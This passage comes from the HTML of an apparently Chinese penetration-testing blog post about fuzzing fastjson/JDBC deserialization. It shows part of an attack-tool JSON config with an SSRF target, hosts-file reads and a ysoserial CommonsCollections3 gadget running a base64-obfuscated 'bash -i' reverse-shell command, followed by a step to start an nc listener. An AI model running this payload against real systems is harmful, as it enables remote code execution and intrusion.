class="string">&quot;index.php&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ssrf&quot;</span>:<span class="string">&quot;https://www.baidu.com/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;__defaultFiles&quot;</span>:[<span class="string">&quot;/etc/hosts&quot;</span>,<span class="string">&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;yso&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;CommonsCollections3&quot;</span>:[<span class="string">&quot;CommonsCollections3&quot;</span>,<span class="string">&quot;bash -c &#123;echo,*****==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/01/25/fastjson-jdbc-fuzz/image-20220401164638756.png" alt="image-20220401164638756"></p>
-<p>nc开启监听：</p>
-<p><img src="/2022/01/25/fastjson-jdbc-fuzz/image-20220401165227078.png" alt="image-20220401165227078"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>
 	</div>
 
       
